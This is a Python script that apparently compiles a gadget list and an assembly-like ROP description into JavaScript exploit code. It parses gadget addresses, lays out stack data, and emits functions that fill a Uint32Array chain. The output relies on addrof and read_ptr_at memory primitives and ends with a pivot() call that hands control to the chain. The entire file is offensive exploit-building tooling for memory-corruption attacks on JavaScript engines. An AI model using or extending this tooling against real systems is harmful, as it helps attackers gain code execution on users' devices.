import sys

def prepass(l):
    labels = {}
    sp_offset = 8
    for i in l:
        if i.endswith(':'):
            labels[i[:-1]] = sp_offset
        elif i.startswith('db '):
            q = bytes(list(eval('('+i[3:]+')')))
            assert len(q) % 8 == 0
            sp_offset += len(q)
        elif not i.startswith('$$'): sp_offset += 8
    return labels

def parse_gadgets(l):
    gadgets = {}
    for i in l:
        if i.count(':') < 2: continue
        file, addr, gadget = i.split(':', 2)
        assert file.endswith('-gadgets.txt')
        file = file[:-12]
        try: addr = int(addr, 16)
        except ValueError: continue
        if '//' in gadget:
            gadget, binrepr = gadget.split('//', 1)
            binrepr = bytes.fromhex(binrepr.strip())
        else:
            binrepr = None
        gadget = gadget.strip()
        if gadget == 'ret': gadget = 'nop ; ret'
        if not gadget.endswith(' ; ret'): continue
        gadget = gadget[:-6].replace(' ptr ', ' ')
        if gadget == 'movsxd rax, edi' and binrepr != None and not binrepr.startswith(b'\x48'):
            addr -= 1
        gadgets[gadget] = (file, addr)
        for i in 'byte', 'word', 'dword', 'qword':
            gadget = gadget.replace(' '+i+' ', ' ')
            gadgets[gadget] = (file, addr)
    return gadgets

def final_pass(l, ls, gs):
    ans = []
    sp_offset = 8
    last_gadgets = []
    def push_gadget(g):
        if ' //' in g:
            last_gadgets.append(g.replace(' //', ', //', 1))
        else:
            last_gadgets.append(g+',')
    def push_normal(g):
        comments = []
        while last_gadgets and last_gadgets[-1].startswith('//'):
            comments.append(last_gadgets.pop())
        comments.reverse()
        if len(last_gadgets) == 1:
            g0 = last_gadgets[0]
            c = ''
            if '//' in g0:
                g0, c = g0.split('//', 1)
                g0 = g0.strip()
                c = ' //' + c
            else: g0 = g0[:-1]
            ans.append('set_gadget(%s);%s'%(g0, c))
        elif last_gadgets:
            g0 = last_gadgets.pop()
            if '//' in g0: g0 = g0.replace(', //', ' //', 1)
            else: g0 = g0[:-1]
            ans.append('set_gadgets([\n%s\n%s\n]);'%('\n'.join(last_gadgets), g0))
        last_gadgets[:] = ()
        ans.extend(comments)
        ans.append(g)
    def push_comment(c):
        if last_gadgets: last_gadgets.append('//'+c)
        else: ans.append('//'+c)
    last_custom_code = False
    for i in l:
        if last_custom_code and not i.startswith('$$'):
            push_normal('ropchain_offset = %d;'%(sp_offset//4))
        last_custom_code = i.startswith('$$')
        if i.endswith(':'):
            push_comment(i)
            continue
        elif i.startswith('$$'):
            push_normal(i[2:].replace('SP_OFFSET', str(sp_offset)))
            continue
        elif i == '$': pass
        elif i.startswith('$'):
            push_gadget(i[1:])
        elif i.startswith('dp '):
            offset = eval(i[3:], ls)
            push_gadget('ropchain+%d //%s'%(offset, i[3:]))
        elif i.startswith('dq '):
            data = eval(i[3:], ls)
            low32 = data & 0xffffffff
            high32 = (data >> 32) & 0xffffffff
            push_normal('db([%d, %d]); // %s'%(low32, high32, hex(data)))
            #ans.append('write_mem(ropchain+%d, %r);'%(sp_offset, list((data & 0xffffffffffffffff).to_bytes(8, 'little'))))
        elif i.startswith('db '):
            data = bytes(list(eval('('+i[3:]+')')))
            assert len(data) % 8 == 0
            #if any(data): ans.append('write_mem(ropchain+%d, %r);'%(sp_offset, list(data)))
            if any(data): push_normal('db(%r);'%([int.from_bytes(data[i:i+4], 'little') for i in range(0, len(data), 4)]))
            elif len(data): push_normal('ropchain_offset += %d;'%(len(data) // 4))
            sp_offset += len(data)
            continue
        elif i in gs:
            file, offset = gs[i]
            push_gadget('%s_base+%d //%s'%(file, offset, i))
        else:
            raise SyntaxError(i)
        sp_offset += 8
    push_normal('')
    ans.pop()
    assert sp_offset % 8 == 0
    ans.insert(0, 'var ropchain_array = new Uint32Array(%d);'%(sp_offset // 4))
    ans.insert(1, 'var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);')
    ans.insert(2, 'var ropchain_offset = 2;')
    ans.insert(3, '''\
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}''')
    ans.insert(4, '''\
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}''')
    ans.insert(5, '''\
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}''')
    if 'pivot(ropchain);' not in ans: ans.append('pivot(ropchain);')
    return '\n'.join(ans)

def read_gadgets(f):
    with open(f) as file: return list(file)

def read_asm(f):
    return [i for i in (i.split('#', 1)[0].strip() for i in read_gadgets(f)) if i]

def main(f, g):
    asm = read_asm(f)
    gadgets = parse_gadgets(read_gadgets(g))
    labels = prepass(asm)
    return final_pass(asm, labels, gadgets)

if __name__ == '__main__':
    print(main(*sys.argv[1:]))
